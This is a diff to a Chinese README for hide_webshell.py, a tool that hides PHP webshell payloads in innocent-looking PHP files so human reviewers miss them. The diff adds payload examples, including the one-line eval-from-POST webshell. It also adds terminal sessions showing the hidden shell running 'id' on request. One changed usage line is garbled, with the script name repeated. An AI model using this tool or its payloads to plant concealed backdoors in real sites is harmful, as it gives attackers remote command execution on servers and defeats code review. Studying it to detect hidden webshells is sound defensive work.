@@ -17,7 +17,7 @@ hide_webshell.py: error: the following arguments are required: php, -pf/--payloa
 ## hide webshell
 示例：
 
-`python hide_webshell.py normal.php -pf payload.txt`
+`python hide_webshell.py hide_webshell.py normal.php -pf payload.txt`
 
 ## hide webshell pro
 示例：
@@ -25,27 +25,20 @@ hide_webshell.py: error: the following arguments are required: php, -pf/--payloa
 `python hide_webshell.py normal_pro.php -pf payload.txt --pro`
 
 ## payload 示例
-
-- `systemecho "hacked by Tr0y :)"`
-
-注：如果是 php <7.2 请见对应文件夹
-
-核心变化是：
-1. `create_function` PHP 7.2 版本中被正式废弃的，并在后续版本（如 PHP 8.0）中被移除。现在替换成 `call_user_func`。其实 `call_user_func` 较为麻烦，可以考虑直接用 `system`
-2. 由于变化 1，payload 长度，以及 `normal_pro.php` 的变量要足够多，否则会导致无法正常提取参数
-3. 注意：在 PHP 中，`eval` 是一个语言结构（language construct）而不是函数，因此不能通过变量函数（variable functions）的方式来调用
+- `system("echo \"hacked by Tr0y :)\"");`
+- `@eval($_POST["c"]);`
 
 ## 完整示例
 ```
 # macr0phag3 in ~/Tr0y/webshell-bypassed-human on git:master ✖︎ [14:45:27]
 » cat payload.txt
-systemecho "hacked by Tr0y :)"%
+system("echo \"hacked by Tr0y :)\"");%
 
 # macr0phag3 in ~/Tr0y/webshell-bypassed-human on git:master ✖︎ [14:45:28]
 » p hide_webshell.py normal.php -pf payload.txt && php webshell_hidden.php
 [+] Hide webshell in normal mode
   [-] Get payload from payload.txt
-      Payload is systemecho "hacked by Tr0y :)"
+      Payload is system("echo \"hacked by Tr0y :)\"");
   [-] Get php code from normal.php
 [!] Saved webshell as webshell_hidden.php
 [!] All done
@@ -57,13 +50,41 @@ hacked by Tr0y :)
 » p hide_webshell.py normal_pro.php -pf payload.txt --pro && php webshell_hidden.php
 [+] Hide webshell in pro mode
   [-] Get payload from payload.txt
-      Payload is systemecho "hacked by Tr0y :)"
+      Payload is system("echo \"hacked by Tr0y :)\"");
   [-] Get php code from normal_pro.php
 [!] Saved webshell as webshell_hidden.php
 [!] All done
 
 Bye :)
 hacked by Tr0y :)
+
+# macr0phag3 in ~/Tr0y/webshell-bypassed-human on git:master ✖︎ [14:48:23]
+» cat payload.txt
+@eval($_POST["c"]);%
+
+# macr0phag3 in ~/Tr0y/webshell-bypassed-human on git:master ✖︎ [14:48:24]
+» p hide_webshell.py normal.php -pf payload.txt && php -r '$_POST["c"]="system(\"id\");"; require("webshell_hidden.php");'
+[+] Hide webshell in normal mode
+  [-] Get payload from payload.txt
+      Payload is @eval($_POST["c"]);
+  [-] Get php code from normal.php
+[!] Saved webshell as webshell_hidden.php
+[!] All done
+
+Bye :)
+uid=502(macr0phag3) gid=20(staff) groups=20(staff),12(everyone), ...此处省略
+
+# macr0phag3 in ~/Tr0y/webshell-bypassed-human on git:master ✖︎ [14:48:26]
+» p hide_webshell.py normal_pro.php -pf payload.txt --pro && php -r '$_POST["c"]="system(\"id\");"; require("webshell_hidden.php");'
+[+] Hide webshell in pro mode
+  [-] Get payload from payload.txt
+      Payload is @eval($_POST["c"]);
+  [-] Get php code from normal_pro.php
+[!] Saved webshell as webshell_hidden.php
+[!] All done
+
+Bye :)
+uid=502(macr0phag3) gid=20(staff) groups=20(staff),12(everyone), ...此处省略
 ```
 
 ## 其他
